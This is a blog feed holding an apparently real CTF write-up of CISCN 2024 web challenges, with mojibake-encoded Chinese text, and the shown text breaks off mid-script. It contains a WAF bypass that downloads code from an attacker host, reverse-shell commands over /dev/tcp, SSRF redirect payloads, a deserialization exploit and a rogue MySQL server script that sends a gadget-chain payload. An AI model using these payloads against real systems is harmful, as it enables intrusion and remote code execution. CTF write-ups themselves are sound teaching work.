<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å…‰è¾‰çš„blogå•¦~~</title>
  
  
  <link href="https://1llustrious.github.io/atom.xml" rel="self"/>
  
  <link href="https://1llustrious.github.io/"/>
  <updated>2024-07-25T11:27:59.028Z</updated>
  <id>https://1llustrious.github.io/</id>
  
  <author>
    <name>1llustrious</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCNä¹‹æ—…</title>
    <link href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/"/>
    <id>https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/</id>
    <published>2024-07-25T06:41:22.000Z</published>
    <updated>2024-07-25T11:27:59.028Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li><li><a href="#%E5%88%9D%E8%B5%9B">åˆèµ›</a><ul><li><a href="#simple_php">Simple_php</a></li><li><a href="#easycms">easycms</a></li><li><a href="#easycms_revenge">easycms_revenge</a></li><li><a href="#ez_javaunsolved">ez_java(unsolved)</a></li></ul></li><li><a href="#%E5%8D%8E%E5%8C%97%E5%88%86%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9B">ååŒ—åˆ†åŒºåŠå†³èµ›</a><ul><li><a href="#wp">wp</a><ul><li><a href="#brokenscanner">brokenscanner</a></li><li><a href="#crazydata">crazydata</a></li><li><a href="#fury">fury</a></li></ul></li><li><a href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5">ç¢ç¢å¿µ</a></li></ul></li><li><a href="#%E5%9B%BD%E5%86%B3">å›½å†³</a><ul><li><a href="#awdp">awdp</a><ul><li><a href="#sharecard">sharecard</a></li><li><a href="#solonmaster">SolonMaster</a></li><li><a href="#ezjs">ezjs</a></li></ul></li><li><a href="#%E6%B8%97%E9%80%8F">æ¸—é€</a><ul><li><a href="#erp">ERP</a></li><li><a href="#win-ops88">WIN-OPS88</a></li><li><a href="#win-pc3788">WIN-PC3788</a></li><li><a href="#jinkens">Jinkens</a></li><li><a href="#gitlab">Gitlab</a></li><li><a href="#rodc">RODC</a></li></ul></li></ul></li><li><a href="#%E5%90%8E%E6%97%A5%E8%B0%88">åæ—¥è°ˆ</a></li></ul><!-- tocstop --><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>è¿™æ¬¡å›½èµ›çš„å…¨è¿‡ç¨‹å¯ä»¥è¯´æ¯ä¸€æ­¥çš„ç»“æœéƒ½åœ¨æ„æ–™ä¹‹å¤–ï¼Œè¯ç”Ÿäº†å¾ˆå¤šæƒ³åæ§½çš„ä¸œè¥¿ï¼Œæœ€ç»ˆä¹Ÿæ˜¯ rank14 æˆåŠŸæ‹¿ä¸‹äº†å›½ä¸€ï¼ŒKğŸ‘´ä¹Ÿå…‰è£é€€å½¹äº†ã€‚</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/1721894511769.png" alt="1721894511769"></p><h1 id="åˆèµ›"><span id="åˆèµ›"> åˆèµ›</span></h1><p>æˆ‘æµ‹çœŸ nm è¯¸ç¥é»„æ˜ï¼Œæ˜¯ä¸ªäººéƒ½åœ¨æ¡†æ¡†ä¸Šåˆ†ï¼Œå°¤å…¶æ˜¯æœ€åä¸€å°æ—¶çš„é»‘ç¯ææ€ï¼ŒçœŸ nm ç¦»è°±ã€‚</p><h2 id="simple_php"><span id="simple_php"> Simple_php</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨ %0a ç»•è¿‡ waf</p><p>ç„¶å ip ä½¿ç”¨åå…­è¿›åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur%0al 0xip:80/love -o /tmp/love</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ä¸€ä¸ª sh æ–‡ä»¶</p><p>sh æ–‡ä»¶ä¸ºåå¼¹ shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p>åå¼¹ shell åï¼Œæ²¡æœ‰æ‰¾åˆ° flagï¼ŒæŸ¥çœ‹ /etc/passwdï¼Œå‘ç° mysql ç”¨æˆ·ï¼Œæ¨æµ‹å’Œæ•°æ®åº“æœ‰å…³ï¼ŒçŒœæµ‹ root root å¼±å¯†ç ï¼Œä½†æ˜¯äº¤äº’æ¨¡å¼ä¸æ­£å¸¸ï¼Œé‡‡ç”¨ - e ç›´æ¥æ‰§è¡Œè¯­å¥ã€‚</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518122319975.png" alt="image-20240518122319975"></p><h2 id="easycms"><span id="easycms"> easycms</span></h2><p>flag.php éœ€è¦æ‰“ä¸ª ssrfï¼Œä¸‹ä¸ªæºç ï¼Œæ‰«ä¸€ä¸‹ curl</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518154556964.png" alt="image-20240518154556964"></p><p>æºç ä¸­æ‰¾è°ƒç”¨çš„ä½ç½®</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518155458814.png" alt="image-20240518155458814"></p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518154641235.png" alt="image-20240518154641235"></p><p>åœ¨ \dayrui\Fcms\Control\Api\Api.php</p><p>ç»æŸ¥é˜…å®˜æ–¹æ–‡æ¡£</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518154725338.png" alt="image-20240518154725338"></p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518154741554.png" alt="image-20240518154741554"></p><p>è·¯å¾„åä¸åŒï¼Œä½†æ•ˆæœä¸€æ ·ï¼Œæ„é€ å¦‚ä¸‹ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://ip:port/xxx.php&amp;text=114514</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// é‡å®šå‘åˆ°æŒ‡å®šçš„ URL</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 302 Found&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºä¸èƒ½ç›´æ¥åœ¨ cmd å¼¹ shellï¼Œé€‰æ‹© 302 å¤§æ³•è·³è½¬åˆ°æœ¬åœ° flag.phpï¼Œå¼¹ shell</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240518155349674.png" alt="image-20240518155349674"></p><h2 id="easycms_revenge"><span id="easycms_revenge"> easycms_revenge</span></h2><p>æŠŠé‚£ä¸ª php çš„é‡å®šå‘æ”¹ä¸€ä¸‹ï¼Œç»•è¿‡å›¾ç‰‡æ£€æµ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;GIF89a&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240519121330161.png" alt="image-20240519121330161"></p><h2 id="ez_javaunsolved"><span id="ez_javaunsolved"> ez_java(unsolved)</span></h2><p>é»‘ç¯é˜Ÿå‹äº¤äº†ä¸¤ä¸ªäº†ï¼Œpwn çˆ¹å‡ºäº†ä¸ªåå‡ è§£çš„é¢˜ï¼Œmisc åˆå‡ºäº†ä¸€ä¸ªï¼Œæ²¡äº¤äº†ï¼Œçœ‹çœ‹æ€è·¯å§ã€‚</p><p>é¦–å…ˆç°åœºå­¦äº†ä¸€ä¸‹ JDBC è¿æ¥åˆ° mysql ä¸­äº§ç”Ÿçš„ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.jdbctest.bean.UserBean;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.weaver.tools.cache.SimpleCache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.util.SerializationUtils.serialize;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UserBean</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserBean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> (HashMap)con.newInstance(<span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;tmp/exp.so&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[] age = &quot;d2NzbmRt&quot;.getBytes(StandardCharsets.ISO_8859_1);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> readFileAsString(<span class="string">&quot;2.txt&quot;</span>);</span><br><span class="line">        user.setName(name);</span><br><span class="line">        user.setAge(age);</span><br><span class="line">        user.setObj(map);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(user);</span><br><span class="line">        <span class="comment">//serialize_func.unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//map.put(&quot;src&quot;,age);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFileAsString</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨java.nio.file.Filesè¯»å–æ–‡ä»¶å†…å®¹å¹¶è½¬æ¢ä¸ºString</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(filePath)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-<span class="number">8</span> -*-</span><br><span class="line">#<span class="meta">@Time</span> : <span class="number">2020</span>/<span class="number">7</span>/<span class="number">27</span> <span class="number">2</span>:<span class="number">10</span></span><br><span class="line">#<span class="meta">@Author</span>: Tri0mphe7</span><br><span class="line">#<span class="meta">@File</span> : server.py</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">receive_data</span><span class="params">(conn)</span>:</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.format(data))</span><br><span class="line">    <span class="keyword">return</span> str(data).lower()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">send_data</span><span class="params">(conn,data)</span>:</span><br><span class="line">    print(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.format(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">get_payload_content</span><span class="params">()</span>:</span><br><span class="line">    #fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™  java -jar ysoserial [common7é‚£ä¸ª]  <span class="string">&quot;calc&quot;</span> &gt; a</span><br><span class="line">    file= r<span class="string">&#x27;ser.bin&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        with <span class="title function_">open</span><span class="params">(file, <span class="string">&#x27;rb&#x27;</span>)</span> as f:</span><br><span class="line">            payload_content = str(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        print(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        #calc</span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"># ä¸»è¦é€»è¾‘</span><br><span class="line">def <span class="title function_">run</span><span class="params">()</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        print(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.format(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        # <span class="number">1.</span>å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡</span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            # ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ  <span class="number">1.</span>å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ <span class="number">2.</span>æœåŠ¡ç«¯å“åº”response_ok</span><br><span class="line">            <span class="title function_">receive_data</span><span class="params">(conn)</span></span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            #å…¶ä»–è¿‡ç¨‹</span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            #æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å·</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> in data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            elif <span class="string">&quot;show warnings&quot;</span> in data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> in data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> in data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> in data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                # ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ</span><br><span class="line">                #è·å–payload</span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                #è®¡ç®—payloadé•¿åº¦</span><br><span class="line">                payload_length = str(hex(len(payload_content)<span class="comment">//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)</span></span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                #è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span><br><span class="line">                data_len = str(hex(len(payload_content)<span class="comment">//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)</span></span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                